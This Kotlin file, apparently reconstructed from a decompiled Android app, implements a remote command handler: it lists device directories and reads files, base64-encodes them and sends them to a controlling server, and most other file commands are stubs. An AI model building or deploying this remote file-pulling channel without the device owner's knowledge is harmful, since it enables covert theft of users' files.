package com.storm.safe.rock.service.modules.command

import android.util.Base64
import android.util.Log
import org.json.JSONArray
import org.json.JSONObject
import java.io.File

/**
 * Handles file management commands.
 *
 * Reverse-engineered from JADX: C0347a4 (a4, 466 lines).
 * Vendor name: FileCommandHandler
 *
 * Supported commands:
 * - FILE_LIST, FILE_DOWNLOAD, FILE_DOWNLOAD_HTTP, FILE_DELETE
 * - FILE_RENAME, FILE_CREATE_FOLDER, FILE_COPY, FILE_MOVE
 * - FILE_SEARCH, FILE_STORAGE_INFO, FILE_UPLOAD, FILE_DOWNLOAD_FROM_SERVER
 */
class FileCommandHandler : CommandHandler {

    companion object {
        private const val TAG = "FileCmdHandler"

        /** Maximum file size for WebSocket download (10MB). */
        private const val MAX_DOWNLOAD_SIZE = 10 * 1024 * 1024L
    }

    override fun getSupportedCommands(): Set<String> = setOf(
        "FILE_LIST",
        "FILE_DOWNLOAD",
        "FILE_DOWNLOAD_HTTP",
        "FILE_DELETE",
        "FILE_RENAME",
        "FILE_CREATE_FOLDER",
        "FILE_COPY",
        "FILE_MOVE",
        "FILE_SEARCH",
        "FILE_STORAGE_INFO",
        "FILE_UPLOAD",
        "FILE_DOWNLOAD_FROM_SERVER"
    )

    override suspend fun handle(command: String, params: JSONObject?, context: CommandContext) {
        val requestId = params?.optString("requestId", "") ?: ""

        when (command) {
            "FILE_LIST" -> handleFileList(params, requestId, context)
            "FILE_DOWNLOAD" -> handleFileDownload(params, requestId, context)
            "FILE_DOWNLOAD_HTTP" -> handleFileDownloadHttp(params, context)
            "FILE_DELETE" -> {
                val path = params?.optString("path", "") ?: ""
                Log.d(TAG, "删除文件: $path, requestId=$requestId")
                context.reportLocalServiceUnavailable(requestId)
            }
            "FILE_RENAME" -> {
                val oldPath = params?.optString("oldPath", "") ?: ""
                val newName = params?.optString("newName", "") ?: ""
                Log.d(TAG, "重命名文件: $oldPath -> $newName, requestId=$requestId")
                context.reportLocalServiceUnavailable(requestId)
            }
            "FILE_CREATE_FOLDER" -> {
                val path = params?.optString("path", "") ?: ""
                Log.d(TAG, "创建文件夹: $path, requestId=$requestId")
                context.reportLocalServiceUnavailable(requestId)
            }
            "FILE_COPY" -> {
                val source = params?.optString("sourcePath", "") ?: ""
                val dest = params?.optString("destPath", "") ?: ""
                Log.d(TAG, "复制文件: $source -> $dest, requestId=$requestId")
                context.reportLocalServiceUnavailable(requestId)
            }
            "FILE_MOVE" -> {
                val source = params?.optString("sourcePath", "") ?: ""
                val dest = params?.optString("destPath", "") ?: ""
                Log.d(TAG, "移动文件: $source -> $dest, requestId=$requestId")
                context.reportLocalServiceUnavailable(requestId)
            }
            "FILE_SEARCH" -> {
                val path = params?.optString("path", "/sdcard") ?: "/sdcard"
                val keyword = params?.optString("keyword", "") ?: ""
                Log.d(TAG, "搜索文件: $keyword in $path, requestId=$requestId")
                context.reportLocalServiceUnavailable(requestId)
            }
            "FILE_STORAGE_INFO" -> {
                Log.d(TAG, "获取存储信息, requestId=$requestId")
                context.reportLocalServiceUnavailable(requestId)
            }
            "FILE_UPLOAD" -> {
                val path = params?.optString("path", "") ?: ""
                Log.d(TAG, "上传文件: $path, requestId=$requestId")
                context.reportLocalServiceUnavailable(requestId)
            }
            "FILE_DOWNLOAD_FROM_SERVER" -> {
                val targetPath = params?.optString("targetPath", "") ?: ""
                val fileName = params?.optString("fileName", "") ?: ""
                val fileSize = params?.optLong("fileSize", 0L) ?: 0L
                Log.d(TAG, "从服务器下载文件: $targetPath, size=$fileSize, requestId=$requestId")
                context.reportLocalServiceUnavailable(requestId)
            }
        }
    }

    /**
     * List files in a directory.
     * Vendor: delegates to FileSystemManager.listFiles(path, showHidden)
     * via coroutine on IO dispatcher, sends result via NetworkManager.
     * JADX: C0347a4 case "FILE_LIST" → FileCommandHandler$handleFileList$2
     */
    private fun handleFileList(params: JSONObject?, requestId: String, context: CommandContext) {
        val path = params?.optString("path", "/sdcard") ?: "/sdcard"
        val showHidden = params?.optBoolean("showHidden", false) ?: false
        Log.d(TAG, "获取文件列表: $path, requestId=$requestId")

        try {
            val dir = File(path)
            if (!dir.exists() || !dir.isDirectory) {
                Log.w(TAG, "路径不存在或不是目录: $path")
                val data = JSONObject().apply {
                    put("success", false)
                    put("error", "路径不存在或不是目录: $path")
                    put("requestId", requestId)
                    put("path", path)
                }
                context.sendEvent("file_list_response", data)
                return
            }

            val files = dir.listFiles() ?: emptyArray()
            val fileArray = JSONArray()

            for (file in files) {
                // ADAPT: Vendor filters hidden files based on showHidden flag
                if (!showHidden && file.name.startsWith(".")) continue

                fileArray.put(JSONObject().apply {
                    put("name", file.name)
                    put("size", if (file.isFile) file.length() else 0L)
                    put("isDirectory", file.isDirectory)
                    put("lastModified", file.lastModified())
                    // ADAPT: Vendor also includes permissions, mimeType via FileSystemManager
                })
            }

            val data = JSONObject().apply {
                put("success", true)
                put("path", path)
                put("requestId", requestId)
                put("files", fileArray)
                put("count", fileArray.length())
            }
            context.sendEvent("file_list_response", data)
        } catch (e: Exception) {
            Log.e(TAG, "获取文件列表失败", e)
            val data = JSONObject().apply {
                put("success", false)
                put("error", e.message ?: "读取目录失败")
                put("requestId", requestId)
                put("path", path)
            }
            context.sendEvent("file_list_response", data)
        }
    }

    /**
     * Download file content (read and base64 encode).
     * Vendor: delegates to FileSystemManager.readFile(path) via coroutine,
     * sends base64-encoded content via NetworkManager.
     * JADX: C0347a4 case "FILE_DOWNLOAD" → FileCommandHandler$handleFileDownload$2
     */
    private fun handleFileDownload(params: JSONObject?, requestId: String, context: CommandContext) {
        val path = params?.optString("path", "") ?: ""
        Log.d(TAG, "下载文件(WebSocket): $path, requestId=$requestId")

        if (path.isEmpty()) {
            val data = JSONObject().apply {
                put("success", false)
                put("error", "文件路径为空")
                put("requestId", requestId)
            }
            context.sendEvent("file_download_response", data)
            return
        }

        try {
            val file = File(path)
            if (!file.exists() || !file.isFile) {
                val data = JSONObject().apply {
                    put("success", false)
                    put("error", "文件不存在: $path")
                    put("requestId", requestId)
                }
                context.sendEvent("file_download_response", data)
                return
            }

            if (file.length() > MAX_DOWNLOAD_SIZE) {
                val data = JSONObject().apply {
                    put("success", false)
                    put("error", "文件过大，请使用HTTP下载")
                    put("requestId", requestId)
                    put("size", file.length())
                }
                context.sendEvent("file_download_response", data)
                return
            }

            val bytes = file.readBytes()
            val base64Data = Base64.encodeToString(bytes, Base64.NO_WRAP)

            val data = JSONObject().apply {
                put("success", true)
                put("requestId", requestId)
                put("name", file.name)
                put("path", path)
                put("size", file.length())
                put("data", base64Data)
            }
            context.sendEvent("file_download_response", data)
        } catch (e: Exception) {
            Log.e(TAG, "下载文件失败", e)
            val data = JSONObject().apply {
                put("success", false)
                put("error", e.message ?: "读取文件失败")
                put("requestId", requestId)
            }
            context.sendEvent("file_download_response", data)
        }
    }

    /**
     * Handle FILE_DOWNLOAD_HTTP: upload file to server via HTTP.
     * Vendor: m211878a3 (suspend function)
     */
    private suspend fun handleFileDownloadHttp(params: JSONObject?, context: CommandContext) {
        val path = params?.optString("path", "") ?: ""
        val requestId = params?.optString("requestId", "") ?: ""

        // ADAPT: Vendor builds upload URL from NetworkManager.getServerBaseUrl + "/api/file/upload-from-device"
        val serverBaseUrl = "" // ADAPT: get from NetworkManager
        val uploadUrl = "$serverBaseUrl/api/file/upload-from-device"

        Log.d(TAG, "下载文件(HTTP直传): $path, requestId=$requestId, uploadUrl=$uploadUrl")

        if (uploadUrl.isEmpty() || serverBaseUrl.isEmpty()) {
            Log.e(TAG, "服务器地址未配置")
            return
        }

        context.reportLocalServiceUnavailable(requestId)
    }
}
